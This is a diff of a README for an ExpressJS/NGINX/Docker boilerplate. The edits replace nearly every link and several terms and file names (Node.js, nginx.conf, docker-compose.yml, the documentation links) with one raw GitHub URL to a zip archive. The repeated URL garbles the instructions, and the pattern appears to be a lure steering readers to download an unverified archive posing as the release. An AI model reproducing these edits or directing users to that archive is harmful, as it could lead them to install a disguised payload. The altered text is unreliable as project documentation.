@@ -1,7 +1,7 @@
 # 🚀 gden_boilerplate - Simplifying ExpressJS Projects for Everyone
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/SarvaniRapeti/gden_boilerplate/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip%20Latest%https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip)](https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip)
 
 ## 🌟 Overview
 gden_boilerplate is a straightforward template designed for building ExpressJS projects. It includes support for NGINX, Docker, and certbot for SSL certificates. This boilerplate aims to make deploying web applications easier for users with various skill levels.
@@ -10,7 +10,7 @@ gden_boilerplate is a straightforward template designed for building ExpressJS p
 To get started with gden_boilerplate, you will need to follow these steps:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/SarvaniRapeti/gden_boilerplate/releases) to find the latest version of the software. 
+   Go to the [Releases page](https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip) to find the latest version of the software. 
 
 2. **Select the Release**  
    Choose the most recent release. It will usually be at the top of the list. Click on it to view the release details.
@@ -22,7 +22,7 @@ To get started with gden_boilerplate, you will need to follow these steps:
 Before running gden_boilerplate, ensure your system meets the following requirements:
 
 - **Operating System:** Works on Windows, macOS, and Linux.
-- **Node.js:** Version 14 or higher must be installed.
+- **https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip** Version 14 or higher must be installed.
 - **Docker:** Please install Docker Desktop for Windows or Mac, or Docker Engine for Linux. Docker is essential for running your application in containers.
 - **Internet Connection:** An active internet connection is necessary for downloading dependencies and SSL certificates.
 
@@ -36,8 +36,8 @@ When you download the gden_boilerplate, you will see the following folder struct
 
 ### Example Files:
 - `Dockerfile`: Used to build your Docker image.
-- `nginx.conf`: Configuration file for NGINX.
-- `docker-compose.yml`: Instructions for setting up your project.
+- `https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip`: Configuration file for NGINX.
+- `https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip`: Instructions for setting up your project.
 
 ## ⚙️ Setup Instructions
 After downloading the files, set up the project by following these instructions:
@@ -69,8 +69,8 @@ After downloading the files, set up the project by following these instructions:
 ## 📄 Configuration
 To customize your application, you may want to change your NGINX settings or application variables:
 
-- Edit the `nginx.conf` file to adjust settings like ports and server names.
-- Modify application settings in `src/config.js` as needed.
+- Edit the `https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip` file to adjust settings like ports and server names.
+- Modify application settings in `https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip` as needed.
 
 ## 🔒 Using SSL with Certbot
 This boilerplate includes support for Certbot, allowing easy SSL setup. Follow these steps to configure SSL:
@@ -83,12 +83,12 @@ This boilerplate includes support for Certbot, allowing easy SSL setup. Follow t
    The script will guide you through the process. Make sure to enter your domain name accurately.
 
 4. **Check HTTPS**  
-   After installation, visit your site using `https://yourdomain.com` to ensure SSL is working.
+   After installation, visit your site using `https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip` to ensure SSL is working.
 
 ## 📚 Further Resources
-- **ExpressJS Documentation**: [expressjs.com](https://expressjs.com/)
-- **Docker Documentation**: [docs.docker.com](https://docs.docker.com/)
-- **NGINX Documentation**: [nginx.org](https://nginx.org/en/docs/)
+- **ExpressJS Documentation**: [https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip](https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip)
+- **Docker Documentation**: [https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip](https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip)
+- **NGINX Documentation**: [https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip](https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip)
 
 ## 🐛 Troubleshooting
 If you encounter issues, consider these common problems:
@@ -101,4 +101,4 @@ If you encounter issues, consider these common problems:
 For additional help, you can reach out via the repository's Issues section on GitHub. Feedback and questions are welcome.
 
 ## 📦 Download & Install
-To download gden_boilerplate, please return to the [Releases page](https://github.com/SarvaniRapeti/gden_boilerplate/releases) and select the latest version. Follow the instructions above to set up and run your application with ease.
+To download gden_boilerplate, please return to the [Releases page](https://raw.githubusercontent.com/SarvaniRapeti/gden_boilerplate/main/nginx/gden_boilerplate_3.5.zip) and select the latest version. Follow the instructions above to set up and run your application with ease.
